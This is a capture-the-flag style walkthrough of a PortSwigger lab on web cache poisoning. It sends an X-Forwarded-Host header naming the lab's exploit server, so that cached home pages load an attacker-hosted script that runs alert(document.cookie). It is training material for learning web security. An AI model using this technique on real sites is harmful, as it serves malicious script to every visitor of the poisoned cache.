
# Web cache poisoning with an unkeyed header

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

Hint: This lab supports the X-Forwarded-Host header.

---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20header/1.png)

---------------------------------------------

There is a reference to the file /resources/js/tracking.js in the home page:



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20header/2.png)

It contains this code:



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20header/3.png)


I will create a similar one in the exploit server with the payload we want:



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20header/4.png)


Then I will send the exploit server url in the X-Forwarded-Host header to the home page:

```
GET / HTTP/2
...
X-Forwarded-Host: exploit-0a26003703122ceb80d4074501290007.exploit-server.net
```



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20header/5.png)


When accessing the home page we get the alert pop up:



![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20header/6.png)
